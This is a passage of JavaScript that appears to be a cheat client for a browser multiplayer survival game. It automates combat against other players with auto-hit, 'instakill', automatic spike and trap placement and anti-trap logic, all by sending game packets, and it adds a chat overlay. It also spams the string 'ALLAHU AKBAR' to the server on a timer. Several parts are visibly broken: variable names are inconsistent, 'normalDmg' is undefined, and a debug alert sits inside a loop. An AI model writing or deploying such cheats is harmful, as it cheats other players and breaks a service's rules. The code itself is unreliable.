                let n = _s(t.x - g.x) - t.scale,
                    i = _s(t.y - g.y) - t.scale;
                return (
                    n <= (o.maxScreenWidth / 2) * 1.3 &&
                    i <= (o.maxScreenHeight / 2) * 1.3
                );
            }),
            (g.isTeam = function (t) {
                return this == t || (this.team && this.team == t.team);
            }),
            (g.findAllianceBySid = function (t) {
                return !!this.team && wt.find((n) => n === t);
            }),
            g
        );
    }
    removePlayer(t) {
        for (let n = 0; n < J.length; n++)
            if (J[n].id == t) {
                addMenuChText(J[n].name + " left the game", "#FF0000", "", "#FF0000"),
                    J.splice(n, 1);
                break;
            }
    }
    updatePlayers(t, n) {
        tick++, ue.objects, (enemiez = []), (enemy = []), (placeArr = []);
        for (var i = 0; i < J.length; ++i)
            (J[i].forcePos = !J[i].visible), (J[i].visible = !1);
        for (var i = 0; i < t.length; )
            (n = _i(t[i])),
                E.isTeam(n) || enemiez.push(n),
                (n.t1 = void 0 === n.t2 ? Date.now() : n.t2),
                (n.t2 = Date.now()),
                (n.laztx = n.x),
                (n.lazty = n.y),
                (n.x = n.x),
                (n.y = n.y),
                (n.x1 = n.x),
                (n.y1 = n.y),
                (n.x2 = t[i + 1]),
                (n.y2 = t[i + 2]),
                (n.x3 = n.x2 + (n.x2 - n.laztX)),
                (n.y3 = n.y2 + (n.y2 - n.laztY)),
                (n.deathDir =
                 caf(
                {
                    x: E.x3,
                    y: E.y3,
                },
                {
                    x: E.laztX,
                    y: E.laztY,
                }
            ) - Math.PI),
                (n.d1 = void 0 === n.d2 ? t[i + 3] : n.d2),
                (n.d2 = t[i + 3]),
                (n.dt = 0),
                (n.buildIndex = t[i + 4]),
                (n.weaponIndex = t[i + 5]),
                (n.oldReloads[n.primaryWeapon] = n.reloads[n.primaryWeapon]),
                (n.oldReloads[n.secondaryWeapon] = n.reloads[n.secondaryWeapon]),
                -1 == n.buildIndex &&
                (n.reloads[n.weaponIndex] = Math.max(
                0,
                n.reloads[n.weaponIndex] - 1e3 / 9
            )),
                (n.turretReload = Math.max(0, n.turretReload - 1e3 / 9)),
                (n.weaponVariant = t[i + 6]),
                (n.primaryWeapon = n.weaponIndex < 9 ? n.weaponIndex : n.primaryWeapon),
                (n.primaryVariant =
                 n.weaponIndex < 9 ? n.weaponVariant : n.primaryVariant),
                (n.secondaryWeapon =
                 n.weaponIndex >= 9 ? n.weaponIndex : n.secondaryWeapon),
                (n.zecondaryVariant =
                 n.weaponIndex >= 9 ? n.weaponVariant : n.zecondaryVariant),
                (n.team = t[i + 7]),
                (n.isLeader = t[i + 8]),
                (n.lastSkinIndex = n.skinIndex),
                (n.skinIndex = t[i + 9]),
                (n.tailIndex = t[i + 10]),
                (n.iconIndex = t[i + 11]),
                (n.zIndex = t[i + 12]),
                (n.visible = !0),
                (y == E ? (n.inTrap = et
                           .filter(
                (t) => t.trap && t.active && !t.teamObj(E) && 100 >= cdf(t, n)
            ).sort(function (t, i) {
                return cdf(t, n) - cdf(i, n);
            })[0]) : (n.inTrap = et
                      .filter(
                (t) => t.dmg && t.active && !t.teamObj(E) && E.scale * 1.5 + t.getScale() >= cdf(t, n)
            )
                      .sort(function (t, i) {
                return cdf(t, n) - cdf(i, n);
            })[0]) || (n.inTrap = et
                       .filter(
                (t) => t.trap && t.active && !t.teamObj(E) && 100 >= cdf(t, n)
            )
                       .sort(function (t, i) {
                return cdf(t, n) - cdf(i, n);
            })[0])),
                (i += 13),
                (n = void 0);
        if(E.inTrap && E.inTrap.dmg) {
            antiPushobj = E.inTrap;
        } else {
            antiPushobj = false;
        }
        if (
            ((enemy =
              enemiez.sort(function (t, n) {
                return cdf(t, E) - cdf(n, E);
            })[0] || []),
             placer.toggle && place(placer.itemIndex, vs()),
             tickLow[tick] && tickLow[tick].forEach((t) => t()),
             tick % 90 == 0 && socket.send("ALLAHU AKBAR"),
             popo && ee.send("6", animate(!0, 5)),
             E.inTrap &&
             !izHitting &&
             0 ==
             E.reloads[
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon
            ] &&
             ((izHitting = !0), ee.send("K", 1)),
             izHitting &&
             0 !=
             E.reloads[
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon
            ] &&
             ((izHitting = !1), ee.send("K", 1)),
             !E.inTrap)
        ) {
            let o = Tn,
                a = !1,
                r = et.filter(
                    (t) =>
                    t.active &&
                    E.canSee(t) &&
                    (t.dmg || "teleporter" == t.name) &&
                    !t.teamObj(E)
                );
            newPos = {
                x: E.x2 + (E.x2 - E.laztX) * 1.15 + 50 * Math.cos(o),
                y: E.y2 + (E.y2 - E.laztY) * 1.15 + 50 * Math.sin(o),
            };
            let s = {
                x: E.x2 + (E.x3 - E.laztX) + 50 * Math.cos(o),
                y: E.y2 + (E.y3 - E.laztY) + 50 * Math.sin(o),
            };
            for (let l = 0; l < r.length; l++)
                if (
                    (enemy != [] &&
                     fgdo(r[l], s) < (r[l].scale + E.scale) * 2 &&
                     fgdo(s, enemy, !0) < R.weapons[E.primaryWeapon].range &&
                     6 != E.skinIndex &&
                     ((forceZolder = !0),
                      setTickout(() => {
                        forceZolder = !1;
                    }, 1),
                      addMenuChText("Anti Velocity Spiketick", "yellow", "", "yellow")),
                     fgdo(r[l], newPos) < r[l].scale + E.scale + 5)
                ) {
                    (a = Math.atan2(E.y2 - r[l].y, E.x2 - r[l].x)),
                        (E.obj = r[l]),
                        (breakMarker = [r[l].x, r[l].y, r[l].scale, r[l].owner.sid]);
                    break;
                }
            a || ((E.obj = !1), (breakMarker = [])),
                E.alive && (!1 != a ? ee.send("e") : ee.send("a", o)),
                E.obj &&
                !izHitting &&
                0 ==
                E.reloads[
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon
            ] &&
                (E.weaponIndex !=
                 (10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon) &&
                 Yt(
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon,
                1
            ),
                 (izHitting = !0),
                 ee.send("K", 1)),
                izHitting &&
                0 !=
                E.reloads[
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon
            ] &&
                ((izHitting = !1), ee.send("K", 1));
        }
        if (
            (inztakillData.toggle &&
             enemy &&
             !gonnainzta &&
             6 != enemy.skinIndex &&
             fgdo(E, enemy) <= R.weapons[E.primaryWeapon].range + 2 * E.scale &&
             (Jn(0, 1),
              (gonnainzta = !0),
              setTickout(() => {
                (inztakillData.inInzta = !0),
                    KTA.executeInztakill(),
                    setTickout(() => {
                    (inztakillData.inInzta = !1), (gonnainzta = !1);
                }, 3);
            }, 1)),
             tankBreak ||
             autohitting ||
             gonnainzta ||
             (autoG.toggle
              ? E.zecondaryVariant < autoG.toVar && 10 == E.secondaryWeapon
              ? E.weaponIndex != E.secondaryWeapon &&
              (Yt(E.secondaryWeapon, 1), (autoG.weapon = E.secondaryWeapon))
              : E.primaryVariant < autoG.toVar &&
              E.weaponIndex != E.primaryWeapon &&
              (Yt(E.primaryWeapon, 1), (autoG.weapon = E.primaryWeapon))
              : E.inTrap || E.obj
              ? 10 == E.secondaryWeapon
              ? E.weaponIndex != E.secondaryWeapon && Yt(E.secondaryWeapon, 1)
              : 0 != E.reloads[E.primaryWeapon] &&
              E.weaponIndex != E.primaryWeapon &&
              Yt(E.primaryWeapon, 1)
              : 0 != E.reloads[E.primaryWeapon]
              ? E.weaponIndex != E.primaryWeapon && Yt(E.primaryWeapon, 1)
              : 0 != E.reloads[E.secondaryWeapon]
              ? E.weaponIndex != E.secondaryWeapon && Yt(E.secondaryWeapon, 1)
              : (8 == E.primaryWeapon || 7 == E.primaryWeapon) && (enemy.length && cdf(E, enemy) > 450)
              ? E.weaponIndex != E.primaryWeapon && Yt(E.primaryWeapon, 1)
              : 10 == E.secondaryWeapon
              ? E.weaponIndex != E.secondaryWeapon && Yt(E.secondaryWeapon, 1)
              : E.weaponIndex != E.primaryWeapon && Yt(E.primaryWeapon, 1)),
             enemy)
        ) {
            let c = et
            .filter(
                (t) =>
                t.dmg &&
                t.active &&
                t.teamObj(E) &&
                cdf(t, {
                    x: enemy.x2,
                    y: enemy.y2,
                }) <=
                2 * E.scale + t.scale
            )
            .sort(
                (t, n) =>
                Math.hypot(enemy.y2 - t.y, enemy.x2 - t.x) -
                Math.hypot(enemy.y2 - n.y, enemy.x2 - n.x)
            )[0];
            0 == E.reloads[E.primaryWeapon] &&
                c &&
                cdf(c, {
                x: enemy.x2,
                y: enemy.y2,
            }) <=
                E.scale + c.scale &&
                cdf(
                {
                    x: E.x2,
                    y: E.y2,
                },
                enemy
            ) <=
                R.weapons[E.primaryWeapon].range + 70
                ? (Yt(E.primaryWeapon, 1),
                   (autohitting = !0),
                   Jn(0, 1),
                   setTickout(() => {
                Jn(7, 0),
                    ee.send("K", 1),
                    setTickout(() => {
                    (autohitting = !1),
                        ee.send("K", 1),
                        0 == E.turretReload && Jn(53, 0);
                }, 1);
            }, 1))
            : (autohitting = !1);
        }
        if (
            (inztakillData.aim ||
             autohitting ||
             gonnainzta ||
             (forceZolder
              ? (Jn(6, 0), Jn(11, 1))
              : tankBreak &&
              0 ==
              E.reloads[
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon
            ]
              ? (E.weaponIndex !=
                 (10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon) &&
                 Yt(
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon,
                1
            ),
                 Jn(40, 0),
                 Jn(11, 1))
              : (E.inTrap &&
                 0 ==
                 E.reloads[
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon
            ]) ||
              (E.obj &&
               0 ==
               E.reloads[
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon
            ])
              ? Jn(40, 0)
              : autoG.toggle && 0 == E.reloads[autoG.weapon]
              ? Jn(40, 0)
              : emptAnti
              ? (Jn(22, 0), Jn(11, 1))
              : E.shameCount && 45 != E.skinIndex && tick % 9 == 0
              ? (Jn(7, 0), Jn(11, 1))
              : 400 >= fgdo(E, enemy)
              ? (Jn(6, 0), Jn(11, 1))
              : (Jn(12, 0), Jn(11, 1))),
             millData.toggle &&
             cdf(millData, {
                x: E.laztX,
                y: E.laztY,
            }) >= R.list[E.items[3]].scale)
        ) {
            let d =
                caf(
                    {
                        x: E.x1,
                        y: E.y1,
                    },
                    E
                ) + Math.PI;
            place(3, d - (70 * Math.PI) / 180),
                place(3, d),
                place(3, d + (70 * Math.PI) / 180),
                (millData.x = E.x2),
                (millData.y = E.y2);
        }
        let h = {
            inTrap: !1,
        },
            u = et
        .filter(
            (t) =>
            t.trap &&
            t.active &&
            t.teamObj(E) &&
            cdf(t, enemy) <= enemy.scale + t.getScale() + 5
        )
        .sort(function (t, n) {
            return cdf(t, enemy) - cdf(n, enemy);
        })[0];
        u ? (h.inTrap = !0) : (h.inTrap = !1),
            300 >= cdf(E, enemy) &&
            (200 >= cdf(E, enemy) && h.inTrap
             ? placeArry(
            2,
            caf(E, u) - Math.PI / 2,
            caf(E, u) + Math.PI + Math.PI / 2,
            Math.PI / 38
        )
             : placeArry(4, 0 + caf(E, enemy), 2 * Math.PI, Math.PI / 38)),
            enemy && autoPush(enemy),
            ee.send("D", vs()),
            J.forEach((t) => {
            if(y.reloads[y.weaponIndex] == 0 && y.doit) {
                y.preplaceAble = true;
                y.doit = false;
                setTickout(() => {
                    y.preplaceAble = false;
                }, 2);
            } else {
                y.doit = true;
            }
            (t.laztX = t.x2), (t.laztY = t.y2);
        });
    }
    weaponHit(t, n, i) {
        let o = _i(t);
        if (o && (o.startAnim(n, i), (o.reloads[i] = R.weapons[i].speed), n)) {
            let a = gameHitobjectz;
            (gameHitobjectz = []),
                setTickout(() => {
                let t =
                    R.weapons[i].dmg *
                    T.weaponVariants[o[(i < 9 ? "prima" : "zeconda") + "ryVariant"]]
                .val *
                    (R.weapons[i].sDmg || 1) *
                    (40 == o.skinIndex ? 3.3 : 1);
                a.forEach((n) => {
                    (n.health -= t),
                        Hn.showText(
                        n.x,
                        n.y,
                        20,
                        0.18,
                        500,
                        Math.round(Math.abs(t)),
                        n.teamObj(E) ? "#24b0ff" : "#f72d71"
                    );
                });
            }, 1);
        }
    }
    nextTickLogic() {}
    addObject(t, n, i, o, a, r, s, l) {
        let c = {};
        return (
            (c.sid = t),
            (s = s || {}),
            (c.sentTo = {}),
            (c.gridLocations = []),
            (c.active = !0),
            (c.doUpdate = s.doUpdate),
            (c.x = n),
            (c.y = i),
            (c.dir = 0),
            (c.xWiggle = 0),
            (c.yWiggle = 0),
            (c.scale = a),
            (c.type = r),
            (c.id = s.id),
            (c.owner = l),
            (c.name = s.name),
            (c.isItem = null != c.id),
            (c.group = s.group),
            (c.health = s.health),
            (c.maxHealth = s.health),
            (c.layer = 2),
            null != c.group
            ? (c.layer = c.group.layer)
            : 0 == c.type
            ? (c.layer = 3)
            : 2 == c.type
            ? (c.layer = 0)
            : 4 == c.type && (c.layer = -1),
            (c.colDiv = s.colDiv || 1),
            (c.blocker = s.blocker),
            (c.ignoreCollision = s.ignoreCollision),
            (c.dontGather = s.dontGather),
            (c.hideFromEnemy = s.hideFromEnemy),
            (c.friction = s.friction),
            (c.projDmg = s.projDmg),
            (c.dmg = s.dmg),
            (c.pDmg = s.pDmg),
            (c.pps = s.pps),
            (c.zIndex = s.zIndex || 0),
            (c.turnSpeed = s.turnSpeed),
            (c.req = s.req),
            (c.trap = s.trap),
            (c.healCol = s.healCol),
            (c.teleport = s.teleport),
            (c.boostSpeed = s.boostSpeed),
            (c.projectile = s.projectile),
            (c.shootRange = s.shootRange),
            (c.shootRate = s.shootRate),
            (c.shootCount = c.shootRate),
            (c.spawnPoint = s.spawnPoint),
            (c.changeHealth = function (t, n) {
                return (c.health += t), c.health <= 0;
            }),
            (c.getScale = function (t, n) {
                return (
                    (t = t || 1),
                    c.scale *
                    (c.isItem || 2 == c.type || 3 == c.type || 4 == c.type
                     ? 1
                     : 0.6 * t) *
                    (n ? 1 : c.colDiv)
                );
            }),
            (c.visibleToPlayer = function (t) {
                return (
                    !c.hideFromEnemy ||
                    (c.owner &&
                     (c.owner == t || (c.owner.team && t.team == c.owner.team)))
                );
            }),
            (c.update = function (t) {
                c.active &&
                    (c.xWiggle && (c.xWiggle *= c.pow(0.99, t)),
                     c.yWiggle && (c.yWiggle *= c.pow(0.99, t))),
                    c.turnSpeed && (c.dir += c.turnSpeed * t);
            }),
            (c.teamObj = function (t) {
                return (
                    null != this.owner &&
                    ((this.owner && t.sid === this.owner.sid) ||
                     t.findAllianceBySid(this.owner.sid))
                );
            }),
            c
        );
    }
    removeObject() {}
    wiggleObject(t, n) {
        let i = Ho(n);
        i &&
            ((i.xWiggle += T.gatherWiggle * Math.cos(t)),
             (i.yWiggle += T.gatherWiggle * Math.sin(t)),
             i.health && gameHitobjectz.push(i));
    }
    getVelocity(t) {
        let n = caf(
            {
                x: t.laztX,
                y: t.laxtY,
            },
            t
        ),
            i = cdf(
                {
                    x: t.laztX,
                    y: t.laxtY,
                },
                t
            ),
            o = t.x + (4 * Math.cos(n) * window.pingTime) / 111.1111,
            a = t.y + (4 * Math.sin(n) * window.pingTime) / 111.1111;
        return [i, o, a, n];
    }
    begin() {
        R.weapons.forEach((t) => {
            KTA.potentialdmgz.push({
                id: t.id,
                normalDmg: t.dmg,
                goldDmg: normalDmg * T.weaponVariants[1].val,
                diamondDmg: normalDmg * T.weaponVariants[2].val,
                rubyDmg: normalDmg * T.weaponVariants[3].val,
            });
        });
    }
    findDmgZource(t) {
        let n = et.filter(
            (t) => t.active && t.dmg && E.canSee(t) && cdf(E, t) <= E.scale + t.scale
        )[0];
        if (n) {
            if (t == n.dmg) return "zpikez";
        } else
            J.forEach((n) => {
                (n.primary = KTA.potentialdmgz.find((t) => t.id === n.primaryWeapon)),
                    (n.zecondary = KTA.potentialdmgz.find(
                    (t) => t.id === n.zecondaryDmg
                )),
                    (n.normalPrimaryDmg =
                     R.weapons[E.primaryWeapon].dmg *
                     T.weaponVariants[E.primaryVariant].val),
                    (n.normalZecondaryDmg =
                     R.weapons[E.secondaryWeapon].dmg *
                     T.weaponVariants[E.zecondaryVariant].val),
                    (n.primary.dmg = 0),
                    n.primary.forEach((i) => {
                    i == t && (n.primary.dmg = i);
                });
            });
    }
}
let KTA = new KTAa();
class Utils {
    static getDist(t, n, i = "", o = "") {
        return hypot(
            t[`x${i || ""}`] - n[`x${o || ""}`],
            t[`y${i || ""}`] - n[`y${o || ""}`]
        );
    }
    static getAngle(t, n, i = "", o = "") {
        return Math.atan2(
            t[`y${i || ""}`] - n[`y${o || ""}`],
            t[`x${i || ""}`] - n[`x${o || ""}`]
        );
    }
    static calculateHarmonicMean(t) {
        let n = t.reduce((t, n) => t + 1 / Math.pow(2, n), 0);
        return t.length / n;
    }
    static inBetween(t, n) {
        let i,
            o = [, ,],
            a;
        if (
            (Math.sin(t) > 0 && Math.cos(t) > 0
             ? ((o[0] = n[0]), (o[1] = n[1]))
             : Math.sin(t) > 0 && 0 > Math.cos(t)
             ? ((t -= Math.PI / 2),
                (o[0] = n[0] - Math.PI / 2),
                (o[1] = n[1] - Math.PI / 2))
             : 0 > Math.sin(t) && 0 > Math.cos(t)
             ? ((t -= Math.PI), (o[0] = n[0] - Math.PI), (o[1] = n[1] - Math.PI))
             : 0 > Math.sin(t) &&
             Math.cos(t) > 0 &&
             ((t -= (3 * Math.PI) / 2),
              (o[0] = n[0] - (3 * Math.PI) / 2),
              (o[1] = n[1] - (3 * Math.PI) / 2)),
             Math.sin(o[0]) > 0 && Math.cos(o[0]) > 0
             ? (i = 1)
             : Math.sin(o[0]) > 0 && 0 > Math.cos(o[0])
             ? (i = 2)
             : 0 > Math.sin(o[0]) && 0 > Math.cos(o[0])
             ? (i = 3)
             : 0 > Math.sin(o[0]) && Math.cos(o[0]) > 0 && (i = 4),
             Math.sin(o[1]) > 0 && Math.cos(o[1]) > 0
             ? (a = 1)
             : Math.sin(o[1]) > 0 && 0 > Math.cos(o[1])
             ? (a = 2)
             : 0 > Math.sin(o[1]) && 0 > Math.cos(o[1])
             ? (a = 3)
             : 0 > Math.sin(o[1]) && Math.cos(o[1]) > 0 && (a = 4),
             1 == i)
        )
            return Math.sin(t) < Math.sin(o[0])
                ? 1 == a && Math.sin(t) < Math.sin(o[2])
            : 1 != a || Math.sin(t) < Math.sin(o[2]);
        if (1 == a) return Math.sin(t) < Math.sin(o[1]);
        if (2 == i) return 2 == a && Math.sin(o[0]) < Math.sin(o[1]);
        if (3 == i)
            return !!(i > a) || (!(i < a) && Math.sin(o[0]) < Math.sin(o[1]));
        if (4 == i)
            return !!(i > a) || (!(i < a) && Math.sin(o[0]) > Math.sin(o[1]));
    }
}

function simulateKB(t, n) {
    let i = E,
        o = be,
        a = ue,
        { xVel: r, yVel: s } = {
            xVel: 0,
            yVel: 0,
        };
    (r = Math.abs(n.x2 - n.laztX)), (s = Math.abs(n.y2 - n.laztY));
    let l = cdf(
        {
            x: 0,
            y: 0,
        },
        {
            x: r * o,
            y: s * o,
        }
    ),
        c = Utils.getAngle(
            {
                x: n.laztX,
                y: n.laztY,
            },
            n,
            0,
            2
        ),
        d = Math.min(4, Math.max(1, Math.round(l / 40))),
        h = 1 / d,
        u = {
            x: 0,
            y: 0,
        },
        p = 0,
        f = 0;
    r && (r -= r * o * h), s && (s -= s * o * h);
    let $ = {
        x: n.x2 + Math.cos(c) * l,
        y: n.y2 + Math.sin(c) * l,
    },
        g = l;
    for (
        u = {
            x: $.x,
            y: $.y,
        };
        g > 0;

    ) {
        let m = a.getGridArrays($.x, $.y, n.scale);
        for (let _ = 0; _ < m.length; _++)
            for (let k = 0; k < m[_].length; k++) {
                let v = m[_][k];
                if (!v.active) continue;
                alert("wow"), console.warn(i.x, i.x2, i.y, i.y2);
                let b = n.scale + v.scale;
                if (
                    cdf(
                        {
                            x: n.x2,
                            y: n.y2,
                        },
                        v
                    ) >= b
                ) {
                    let w = i.scale + (n.getScale ? n.getScale() : n.scale);
                    if (
                        cdf(
                            {
                                x: n.x2,
                                y: n.y2,
                            },
                            v
                        ) >= w
                    ) {
                        if (v.ignoreCollision) continue;
                        let x = caf(v, n) - Math.PI;
                        v.dmg && (p += v.dmg),
                            (u.x = v.x + w * Math.cos(x)),
                            (u.y = v.y + w * Math.sin(x)),
                            console.warn(u),
                            (g *= 0.75),
                            f++;
                    }
                }
            }
        return (
            r && (r *= Math.pow(0.993, o)) <= 0.01 && r >= -0.01 && (r = 0),
            s && (s *= Math.pow(0.993, o)) <= 0.01 && s >= -0.01 && (s = 0),
            (g = cdf(
                {
                    x: 0,
                    y: 0,
                },
                {
                    x: r * o,
                    y: s * o,
                }
            )),
            (u.x += r * o * h),
            (u.y += s * o * h),
            console.log(u, E.x2, E.y2),
            {
                totalDmg: p,
                totalCollisions: f,
                finalPos: u,
            }
        );
    }
}
let potdmgz = [];
class potHeal {
    constructor() {}
    calcPot(t, n, i = 0) {
        (this.player = t),
            (this.tmpObj = n),
            (this.id = n.id),
            0 == this.tmpObj.reloads[this.tmpObj.primaryWeapon] &&
            (i +=
             R.weapons[this.tmpObj.primaryWeapon].dmg *
             T.weaponVariants[this.tmpObj.primaryVariant].val *
             (R.weapons[this.tmpObj.primaryWeapon].sDmg || 1)),
            (i *= 1.5),
            0 == this.tmpObj.reloads[this.tmpObj.secondaryWeapon] &&
            (i +=
             R.weapons[this.tmpObj.secondaryWeapon].dmg *
             T.weaponVariants[this.tmpObj.zecondaryVariant].val *
             (R.weapons[this.tmpObj.secondaryWeapon].sDmg || 1)),
            7 == this.player.skinIndex && tick % 9 == 0 && (i += 5),
            this.tmpObj.turretReload <= 1e3 / 9 && (i += 25),
            potdmgz.push([
            this.id,
            Math.ceil(i * (6 == this.tmpObj.skinIndex ? 0.75 : 1)),
        ]);
    }
}
let potman = new potHeal();

function getEl(t) {
    return document.getElementById(t);
}
class HtmlAction {
    constructor(t) {
        this.element = t;
    }
    add(t) {
        this.element && (this.element.innerHTML += t);
    }
    newLine(t) {
        let n = "<br>";
        if (t > 0) {
            n = "";
            for (let i = 0; i < t; i++) n += "<br>";
        }
        this.add(n);
    }
    checkBox(t) {
        let n = '<input type = "checkbox"';
        t.id && (n += ` id = ${t.id}`),
            t.style && (n += ` style = ${t.style.replaceAll(" ", "")}`),
            t.class && (n += ` class = ${t.class}`),
            t.checked && (n += " checked"),
            t.onclick && (n += ` onclick = ${t.onclick}`),
            (n += ">"),
            this.add(n);
    }
    text(t) {
        let n = '<input type = "text"';
        t.id && (n += ` id = ${t.id}`),
            t.style && (n += ` style = ${t.style.replaceAll(" ", "")}`),
            t.class && (n += ` class = ${t.class}`),
            t.size && (n += ` size = ${t.size}`),
            t.maxLength && (n += ` maxLength = ${t.maxLength}`),
            t.value && (n += ` value = ${t.value}`),
            t.placeHolder &&
            (n += ` placeHolder = ${t.placeHolder.replaceAll(" ", "&nbsp;")}`),
            (n += ">"),
            this.add(n);
    }
    select(t) {
        let n = "<select";
        for (let i in (t.id && (n += ` id = ${t.id}`),
                       t.style && (n += ` style = ${t.style.replaceAll(" ", "")}`),
                       t.class && (n += ` class = ${t.class}`),
                       (n += ">"),
                       t.option))
            (n += `<option value = ${t.option[i].id}`),
                t.option[i].selected && (n += " selected"),
                (n += `>${i}</option>`);
        (n += "</select>"), this.add(n);
    }
    button(t) {
        let n = "<button";
        t.id && (n += ` id = ${t.id}`),
            t.style && (n += ` style = ${t.style.replaceAll(" ", "")}`),
            t.class && (n += ` class = ${t.class}`),
            t.onclick && (n += ` onclick = ${t.onclick}`),
            (n += ">"),
            t.innerHTML && (n += t.innerHTML),
            (n += "</button>"),
            this.add(n);
    }
    selectMenu(t) {
        let n = "<select";
        if (!t.id) {
            alert("please put id skid");
            return;
        }
        (window[t.id + "Func"] = function () {}),
            t.id && (n += ` id = ${t.id}`),
            t.style && (n += ` style = ${t.style.replaceAll(" ", "")}`),
            t.class && (n += ` class = ${t.class}`),
            (n += ` onchange = window.${t.id + "Func"}()`),
            (n += ">");
        let i,
            o = 0;
        for (let a in t.menu)
            (n += `<option value = ${"option_" + a} id = ${"O_" + a}`),
                t.menu[a] && (n += " checked"),
                (n += ` style = "color: ${t.menu[a] ? "#000" : "#fff"}; background: ${
                 t.menu[a] ? "#8ecc51" : "#cc5151"
                 };">${a}</option>`),
                o++;
        for (let r in ((n += "</select>"), this.add(n), (o = 0), t.menu))
            (window[r + "Func"] = function () {
                (t.menu[r] = !!getEl("check_" + r).checked),
                    saveVal(r, t.menu[r]),
                    (getEl("O_" + r).style.color = t.menu[r] ? "#000" : "#fff"),
                    (getEl("O_" + r).style.background = t.menu[r]
                     ? "#8ecc51"
                     : "#cc5151");
            }),
                this.checkBox({
                id: "check_" + r,
                style: `display: ${0 == o ? "inline-block" : "none"};`,
                class: "checkB",
                onclick: `window.${r + "Func"}()`,
                checked: t.menu[r],
            }),
                o++;
        (i = "check_" + getEl(t.id).value.split("_")[1]),
            (window[t.id + "Func"] = function () {
            (getEl(i).style.display = "none"),
                (i = "check_" + getEl(t.id).value.split("_")[1]),
                (getEl(i).style.display = "inline-block");
        });
    }
}
class Html {
    constructor() {
        (this.element = null),
            (this.action = null),
            (this.divElement = null),
            (this.startDiv = function (t, n) {
            let i = document.createElement("div");
            t.id && (i.id = t.id),
                t.style && (i.style = t.style),
                t.class && (i.className = t.class),
                this.element.appendChild(i),
                (this.divElement = i);
            let o = new HtmlAction(i);
            "function" == typeof n && n(o);
        }),
            (this.addDiv = function (t, n) {
            let i = document.createElement("div");
            t.id && (i.id = t.id),
                t.style && (i.style = t.style),
                t.class && (i.className = t.class),
                t.appendID && getEl(t.appendID).appendChild(i),
                (this.divElement = i);
            let o = new HtmlAction(i);
            "function" == typeof n && n(o);
        });
    }
    set(t) {
        (this.element = getEl(t)), (this.action = new HtmlAction(this.element));
    }
    resetHTML(t) {
        this.element.innerHTML = "";
    }
    setStyle(t) {
        this.element.style = t;
    }
    setCSS(t) {
        this.action.add("<style>" + t + "</style>");
    }
}
let HTML = new Html(),
    menuChatDiv = document.createElement("div");
(menuChatDiv.id = "menuChatDiv"),
    document.body.appendChild(menuChatDiv),
    HTML.set("menuChatDiv"),
    HTML.setStyle(`
              position: absolute;
              display: block;
              opacity: 0;
              visibility: hidden;
              left: 0px;
              top: 0px;
              box-shadow: 0px 0px 25px rgba(0, 0, 0, 0);
              overflow: hidden;
              transition: opacity 0.65s ease, box-shadow 0.65s ease;
              `),
    HTML.resetHTML(),
    HTML.setCSS(`
              .chDiv{
                  color: #fff;
                  padding: 5px;
                  width: 470px;
                  height: 280px;
                  background-color: rgba(0, 0, 0, 0);
                  overflow: hidden;
                  transition: background-color 0.65s ease;
                  border-radius: 0 0 3px 0;
              }
              .chMainDiv{
                  font-family: "Hammersmith One";
                  font-size: 12px;
                  max-height: 235px;
                  overflow-y: scroll;
                  -webkit-touch-callout: none;
                  -webkit-user-select: none;
                  -khtml-user-select: none;
                  -moz-user-select: none;
                  -ms-user-select: none;
                  user-select: none;
                  overflow: hidden;
              }
              .chMainBox{
                  transition: background-color 0.65s ease;
                  position: absolute;
                  left: 5px;
                  bottom: 10px;
                  width: 450px;
                  height: 20px;
                  padding: 4px;
                  background-color: rgba(255, 255, 255, 0.1);
                  -webkit-border-radius: 4px;
                  -moz-border-radius: 4px;
                  border-radius: 4px;
                  color: #fff;
                  font-family: "Hammersmith One";
                  font-size: 12px;
                  border: none;
                  outline: none;
                  overflow: hidden;
              }`),
    HTML.startDiv(
    {
        id: "mChDiv",
        class: "chDiv",
    },
    (t) => {
        HTML.addDiv(
            {
                id: "mChMain",
                class: "chMainDiv",
                appendID: "mChDiv",
            },
            (t) => {}
        ),
            t.text({
            id: "mChBox",
            class: "chMainBox",
            placeHolder: "  To chat click here or press / key",
        });
    }
),
    (document.getElementById("mChBox").maxLength = 30);
let menuChats = getEl("mChMain"),
    menuChatBox = getEl("mChBox"),
    menuCBFocus = !1,
    menuChCounts = 0;

function addMenuChText(t, n, i, o, a) {
    HTML.set("menuChatDiv");
    let r = document.getElementById("mChMain"),
        s = new Date(),
        l = s.getHours(),
        c = s.getMinutes(),
        d = (l % 12 || 12).toString(),
        h = c.toString().padStart(2, "0"),
        u = `${d}:${h} ${l >= 12 ? "PM" : "AM"}`,
        p = document.createElement("div");
    if (((p.className = "chatEntry"), !a)) {
        let f = document.createElement("span");
        (f.style.color = "rgba(255, 255, 255, 0.5)"),
            (f.innerHTML = `${u}`),
            p.appendChild(f);
    }
    let $ = document.createElement("span");
    ($.style.color = o), ($.innerHTML = " " + i), p.appendChild($);
    let g = document.createElement("span");
    (g.style.color = n),
        (g.innerHTML = " " + t),
        p.appendChild(g),
        r.appendChild(p),
        (r.scrollTop = r.scrollHeight),
        menuChCounts++;
}

function resetMenuChText() {
    for (
        menuChats.innerHTML = "";
        document.getElementById("mChMain").hasChildNodes();

    )
        document
            .getElementById("mChMain")
            .removeChild(document.getElementById("mChMain").firstChild);
    menuChCounts = 0;
}
(menuChatBox.value = ""),
    menuChatBox.addEventListener("focus", () => {
    menuCBFocus = !0;
}),
    menuChatBox.addEventListener("blur", () => {
    menuCBFocus = !1;
}),
    (menuChatBox.style.fontFamily = "Hammersmith One");
var button = document.createElement("button");
(button.id = "allah"),
    (button.style.display = "block"),
    (button.style.width = "175px"),
    (button.style.height = "40px"),
    (button.style.borderRadius = "5px"),
    (button.style.textAlign = "center"),
    (button.style.lineHeight = "40px"),
    (button.style.color = "white"),
    (button.style.fontWeight = "bold"),
    (button.style.cursor = "pointer"),
    (button.style.border = "none"),
    (button.style.zIndex = "999"),
    (button.style.position = "absolute"),
